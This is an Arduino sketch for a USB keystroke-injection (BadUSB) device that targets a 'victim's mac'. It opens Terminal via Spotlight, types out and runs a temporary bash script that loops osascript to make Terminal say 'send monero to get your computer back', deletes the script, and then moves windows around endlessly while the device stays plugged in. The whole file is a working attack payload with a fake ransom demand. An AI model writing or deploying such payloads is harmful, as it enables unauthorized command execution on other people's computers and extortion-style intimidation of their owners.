#include <Arduino.h>
#include <Keyboard.h>

void spotlight(char const * text);
void blinkn (int n, int delayTime);

void setup() {
  Keyboard.begin(KeyboardLayout_en_US);
  pinMode(LED_BUILTIN, OUTPUT);
}

void loop() {
      //blink 5 times, then search for terminal in spotlight
      blinkn(5, 1);
      digitalWrite(LED_BUILTIN, HIGH);
      spotlight("terminal");
      delay(1000);
      Keyboard.press(KEY_LEFT_ALT);
      delay(30);
      Keyboard.press(KEY_LEFT_GUI);
      delay(30);
      Keyboard.write('f');
      delay(30);
      Keyboard.releaseAll();
      delay(30);
      Keyboard.press(KEY_LEFT_GUI);
      delay(30);
      Keyboard.write('+');
      delay(30);
      Keyboard.write('+');
      delay(30);
      Keyboard.write('+');
      delay(30);
      Keyboard.write('+');
      delay(30);
      Keyboard.write('+');
      delay(30);
      Keyboard.write('+');
      delay(30);
      Keyboard.releaseAll();
      delay(500);

      //Open nano text editor
      Keyboard.print("nano /tmp/run.sh");
      delay(30);
      Keyboard.write(KEY_RETURN);

      /*** WRITE A SCRIPT TO OPEN MULTIPLE TERMINAL WINDOWS AND SAY SOMETHING ***/
      //this way it will run even if the usb is disconnected

      delay(500);
      Keyboard.print("#!/bin/bash");
      delay(30);
      Keyboard.write(KEY_RETURN);
      delay(30);
      Keyboard.print("for i in ");
      delay(30);

      //open curly brackets
      Keyboard.press(KEY_RIGHT_SHIFT);
      delay(30);
      Keyboard.write('[');
      delay(30);
      Keyboard.releaseAll();
      delay(30);

      Keyboard.print("1..5");
      delay(30);
      
      //close curly brackets
      Keyboard.press(KEY_LEFT_SHIFT);
      delay(30);
      Keyboard.write(']');
      delay(30);
      Keyboard.releaseAll();
      delay(30);

      Keyboard.write(KEY_RETURN);
      delay(30);
      Keyboard.print("do");
      delay(30);
      Keyboard.write(KEY_RETURN);
      delay(30);
      //apple script to open terminal and say something
      Keyboard.print("  osascript -e 'tell app \"Terminal\" to do script \"say send monero to get your computer back\"'");
      delay(30);
      Keyboard.write(KEY_RETURN);
      delay(30);
      Keyboard.print("  sleep 3");
      delay(30);
      Keyboard.write(KEY_RETURN);
      delay(30);
      Keyboard.print("done");
      delay(30);
      Keyboard.write(KEY_RETURN);
      delay(30);
      Keyboard.print("rm /tmp/run.sh");
      delay(30);

      //close nano
      Keyboard.press(KEY_LEFT_CTRL);
      delay(30);
      Keyboard.write('x');
      delay(30);
      Keyboard.releaseAll();
      delay(30);
      Keyboard.write('y');
      delay(30);
      Keyboard.write(KEY_RETURN);
      delay(30);

      //make the script executable and execute it
      Keyboard.print("chmod +x /tmp/run.sh");
      delay(30);
      Keyboard.write(KEY_RETURN);
      delay(30);
      Keyboard.print("/tmp/run.sh");
      delay(30);
      Keyboard.write(KEY_RETURN);
      delay(30);


      
      //keep moving the window while plugghed in (requires magnet app, which is very unlikely to be installed on a victim's mac)
      while (true)
      {
        Keyboard.press(KEY_LEFT_GUI);
        delay(30);
        Keyboard.press(KEY_LEFT_ARROW);
        delay(30);
        Keyboard.releaseAll();
        delay(30);
        Keyboard.press(KEY_LEFT_GUI);
        delay(30);
        Keyboard.press(KEY_UP_ARROW);
        delay(30);
        Keyboard.releaseAll();
        delay(30);
        Keyboard.press(KEY_LEFT_GUI);
        delay(30);
        Keyboard.press(KEY_RIGHT_ARROW);
        delay(30);
        Keyboard.releaseAll();
        delay(30);
        Keyboard.press(KEY_LEFT_GUI);
        delay(30);
        Keyboard.press(KEY_DOWN_ARROW);
        delay(30);
        Keyboard.releaseAll();
        delay(30);
      }

      //turn the led off and wait 15 seconds
      //digitalWrite(LED_BUILTIN, LOW);
      //delay(15000);
 }

 void spotlight(char const * text){
  //open spotlighy
    delay(30);
      Keyboard.press(KEY_LEFT_GUI);
      delay(30);
      Keyboard.write(' ');
      delay(30);
      Keyboard.releaseAll();
  //type text and press enter
      delay(520);
      Keyboard.print(text); 
      delay(30);
      Keyboard.write(KEY_RETURN);
}

//blink the led n times with a delay of delayTime seconds
void blinkn (int n, int delayTime){
  for(int i=0; i<n; i++){
    digitalWrite(LED_BUILTIN, HIGH);
    delay(100);
    digitalWrite(LED_BUILTIN, LOW);
    delay((delayTime*1000) - 100);
  }
}